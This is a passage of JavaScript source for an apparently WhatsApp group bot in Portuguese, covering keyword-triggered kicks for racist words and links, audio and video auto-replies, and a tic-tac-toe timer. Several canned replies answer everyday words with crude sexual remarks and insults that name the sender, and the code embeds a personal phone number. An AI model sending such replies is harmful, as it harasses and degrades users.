	    if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do menor', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do menor', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))

//-- antiracismo          
        if (messagesC.includes("preto")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		
		Pin.updatePresence(from, Presence.composing)
	  	if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		
		setTimeout( () => {
			Pin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de racismos, que isso sirva de exemplo 🚶")
		}, 4000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário,😔🤙")
		}, 0)
	}
	
	        if (messagesC.includes("seu preto")){
		if (!isGroup) return
		if (!isAntiRacismo) return
	    if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		Pin.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		
		setTimeout( () => {
			Pin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
	        if (messagesC.includes("macaco")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		
		Pin.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
			Pin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
	        if (messagesC.includes("pretoimundo")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		Pin.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		
		setTimeout( () => {
			Pin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
	   if (messagesC.includes(".meuid")){
	   Pin.updatePresence(from, Presence.composing)
      Pin.sendMessage(from, trujuh, MessageType.text);
      Pin.sendMessage(from, MessageType + " / " + messageType, MessageType.text);
   }
	
	        if (messagesC.includes("pq vc e preto")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		Pin.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		
		setTimeout( () => {
			Pin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			Pin.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
//-- antilink	
       if (messagesC.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}			
		if (messagesC.includes("https://vm.tiktok.com")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
		if (messagesC.includes("https://api.whatsapp.com/send?phone=")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
		if (messagesC.includes("https://m.kwai.me/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
		if (messagesC.includes("https://s.kwai.app/s/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
		if (messagesC.includes("https:wa.me/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
		if (messagesC.includes("https://")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		if (messagesC.includes("https//www.istagram.com")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
		if (messagesC.includes(".com")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		Pin.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		Pin.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
		
//-- auto-resposta do bot       
	
        if (messagesC.includes("yamete")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/yamete.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

   }
        if (messagesC.includes("bct")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/opa.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

   }   
        if (messagesC.includes("kk")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/atumalaca.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

   } 
        if (messagesC.includes("bemtivi")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/bemtivi.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

   }   
        if (messagesC.includes("zap")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/whats.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

   }   
        if (messagesC.includes("online")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/Pa.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true })

   }   
	    if (messagesC.includes("kkk")){
			Pin.updatePresence(from, Presence.composing)
			reply("kskskskk")
	}
	   
	    if (messagesC.includes("bot")){
			Pin.updatePresence(from, Presence.composing)
			reply("oii")
	}
	    if (messagesC.includes("legal")){
			Pin.updatePresence(from, Presence.composing)
			reply("pega no meu pal")
	}
	    if (messagesC.includes("coelho")){
			Pin.updatePresence(from, Presence.composing)
			reply("123")
	}	
	    if (messagesC.includes("ngm")){
			Pin.updatePresence(from, Presence.composing)
			reply("..ngm😴")
	}	
	    if (messagesC.includes("hora")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/hora.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

    }
	    if (messagesC.includes("cao")){
			Pin.updatePresence(from, Presence.composing)
			reply("* me chama de cao e deixa eu cheira seu cu*")
	}	
	     if (messagesC.includes("cão")){
			Pin.updatePresence(from, Presence.composing)
			reply("vc quer oq cadela🤨")
	}	
	    if (messagesC.includes("kitei")){
			Pin.updatePresence(from, Presence.composing)
			reply("ngm liga...")
	}
	    if (messagesC.includes("eita")){
			Pin.updatePresence(from, Presence.composing)
			reply("eitaa")
	}										
	    if (messagesC.includes("♤")){
			Pin.updatePresence(from, Presence.composing)
			reply("atencão fml meu dono ta triste usou um sinal pra q vcs possam saber..tem como vcs ir no pv dele falar cm ele? wa.me/557187566648 ele vai se sentir mlhr🤧❤")
	}	
	    if (messagesC.includes("Robo")){
			Pin.updatePresence(from, Presence.composing)
			reply("oiii kskskk")
	}	
	    if (messagesC.includes("sla")){
			Pin.updatePresence(from, Presence.composing)
			reply("sla tbm ksk")
	}
	    if (messagesC.includes("opa")){
			Pin.updatePresence(from, Presence.composing)
			reply("opa")
	}	
	    if (messagesC.includes("👉🏻👈🏻")){
			Pin.updatePresence(from, Presence.composing)
			reply(`eita quer transar *${pushname2}* kskskskk`)
	}	
	    if (messagesC.includes("cala")){
			Pin.updatePresence(from, Presence.composing)
			reply("venha calar kskskskk")
	}
	    if (messagesC.includes("oq")){
			Pin.updatePresence(from, Presence.composing)
			reply(";-;")
	}	
	    if (messagesC.includes("como")){
			Pin.updatePresence(from, Presence.composing)
			reply("como?ksksksk")
	}			
	    if (messagesC.includes("♧")){
			Pin.updatePresence(from, Presence.composing)
			reply("junhin quer apoio..")
	}	
	    if (messagesC.includes("tlgd")){
			Pin.updatePresence(from, Presence.composing)
			reply("kkkkkkk tlgd")
	}		
	    if (messagesC.includes("vou")){
			Pin.updatePresence(from, Presence.composing)
			reply("vai la kskskskk")
	}	
	    if (messagesC.includes("tbm")){
			Pin.updatePresence(from, Presence.composing)
			buf = fs.readFileSync(`./Junhin/audio2/eutbm.mp3`)

            Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true })

   }
	    if (messagesC.includes("chato")){
			Pin.updatePresence(from, Presence.composing)
			reply("nossa ..😕")
	}	
	    if (messagesC.includes("vadia")){
			Pin.updatePresence(from, Presence.composing)
			reply("vc acha legal ESSE argumento machista?")
	}	
	    if (messagesC.includes("puta")){
			Pin.updatePresence(from, Presence.composing)
			reply("vc q er")
	}
	    if (messagesC.includes("corno")){
			Pin.updatePresence(from, Presence.composing)
			reply(`vsfdr *${pushname2}* seu merda`)
	}	
	    if (messagesC.includes("557187566648")){
			Pin.updatePresence(from, Presence.composing)
			reply(`oh ${pushname2} meu dono, deve ta dormindo aquele baianokkkk`)
	}
	
	    if (messagesC.includes("bem?")){
			Pin.updatePresence(from, Presence.composing)
			reply("Ss é vc?")
	}	
	    if (messagesC.includes("duvido")){
			Pin.updatePresence(from, Presence.composing)
			reply("meu pal no seu ouvido")
	}	
	    if (messagesC.includes("bem?")){
			Pin.updatePresence(from, Presence.composing)
			reply(`eu to bem valeu por peeguntar *${pushname2}*`)
	}
	    if (messagesC.includes("tmnc")){
			Pin.updatePresence(from, Presence.composing)
			reply(`vai vc, *${pushname2}* vc me disse que já tomou e gostou😛`)
	}
	    if (messagesC.includes("☆")){
			Pin.updatePresence(from, Presence.composing)
			reply("junhin e tão foda q programou um comando com uma estrela kkjkk slc nn é atoa q é o junhin🙈")
	}			
//--MessageType

			const isMedia = (type === 'imageMessage' || type === 'videoMessage')

			const isQuotedText = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

	    
	
     
		
	
	
//--jogo da velha
if (tttset.tttstatus == "off" && tttset.autoEndTime == "on") {
tttset.autoEndTime = "off"
} else if (tttset.tttstatus == "on" && tttset.autoEndTime == "on") {
if (isCmd) {
const randomEndTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomEndTTTXP)
const checkTTTIdEnd = getTTTId(tttset.player)
if (checkTTTIdEnd === undefined) addTTTId(tttset.player)
addTTTpoints(tttset.player, randomEndTTTXP)
Pin.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌\n\n➣  PUNIÇÃO: ${randomEndTTTXP} XP 🔮`, text, {quoted: tttset.mentionPlayer})
} else {
Pin.sendMessage(tttset.local,`❌ O TEMPO DE JOGO EXPIROU ❌`, text, {quoted: tttset.mentionPlayer})
}
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.autoEndTime = "off"
}
//-- cores
      colors = ['red','white','black','blue','yellow','green']

//--Console registo grupos

			if (!isGroup && isCmd) console.log('\x1b[1;37m>', time, color(command), 'from', color(pushname), 'args :', (args.length))

			

//--Console log chat privado

			if (isCmd && isGroup) console.log('\x1b[1;37m>', time, color(command), 'from', (groupName), 'args :', color(args.length))



//---Metadata stiker

			function addMetadata(packname, author) {	

				if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	

				author = author.replace(/[^a-zA-Z0-9]/g, '');	

				let name = `${author}_${packname}`

				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`

				const json = {	

					"sticker-pack-name": packname,

					"sticker-pack-publisher": author,

				}

				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	

				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	



				let len = JSON.stringify(json).length	

				let last	



				if (len > 256) {	

					len = len - 256	

					bytes.unshift(0x01)	

				} else {	

					bytes.unshift(0x00)	

				}	



				if (len < 16) {	

					last = len.toString(16)	

					last = "0" + len	

				} else {	

					last = len.toString(16)	

				}	



				const buf2 = Buffer.from(last, "hex")	

				const buf3 = Buffer.from(bytes)	

				const buf4 = Buffer.from(JSON.stringify(json))	



				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	



				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	

					return `./src/stickers/${name}.exif`	

				})	



			}

if (budy.includes(`alpin`)) {
                const alpin = fs.readFileSync('./alpinstiker/alpin');
                Pin.sendMessage(from, alpin, MessageType.sticker, {quoted: mek})
                  }

		if (budy.includes(`alpin`)) {
                const alpin = fs.readFileSync('./alpinstiker/Dappa');
                Pin.sendMessage(from, alpin, MessageType.sticker, {quoted: mek})
                  }


//--Outras Funções

const apakah = ['Ya',

  'Tidak',

  'Mungkin']

const bisakah = ['Bisa',

  'Tidak Bisa',

  'Mungkin']

const kapankah = ['Hari Lagi',

  'Minggu Lagi',

  'Bulan Lagi',

  'Tahun Lagi']



//--Auto respon

if(budy.match('alpin')){

result = fs.readFileSync(`./temp/stick/emm.webp`)

  Pin.sendMessage(from, result, sticker, {

quoted: mek

  })

}

//--fim auto resposta 1



//--Auto resposta 2

switch(is) {

  case 'canta':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/canta.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'onichan':

buf = fs.readFileSync(`./temp/audio/onichan.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'bot':

buf = fs.readFileSync(`./temp/audio/hehe.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



case 'bot?':

case 'botbotbotbot':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/picap.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break

case 'hehehe':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/juu.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break

  case 'branco':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/rafa.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'ain':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/ain.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'fds':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/fds.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'botruim':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/bot2.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'desgraca':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/desgra.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



  case 'hokages':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/ho.mp3`)

Pin.sendMessage(from, buf, audio, {

  mimetype: 'audio/mp4', quoted: mek, ptt: true

})

break



case '.editff10':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff10.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff9':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff9.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff8':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff8.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff7':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff7.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff6':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff6.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff5':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff5.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff4':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff4.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff3':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff3.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff2':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff2.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editff1':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editff1.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editanime3':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/animeedit1.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editanime2':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/animeedit2.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editanime':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/animeedit.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editgoku':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editgo.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editsaitama':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/saiedit.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editkaneki1':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editkaneki1.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editkaneki':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editkaneki.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editluffy':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editluffy.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editobito':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editobito.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editvegeta':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editvege.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editoverhaul2':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editover2.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editoverhaul':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editover1.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editnaruto':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editna.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editminato':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editminato.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editmadara':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editma.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.edititachi':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/edititachi.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.edithunter':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/edithun.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editescanor':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/escanor.mp4`)

Pin.sendMessage(from, buf, video, {

  mimetype: 'video/mp4', quoted: mek, ptt: true

})

break



case '.editdemonslayer':
  
  if (!isRegister) return reply(mess.only.daftarB)

buf = fs.readFileSync(`./Junhin/audio2/editdemon.mp4`)

Pin.sendMessage(from, buf, video, {

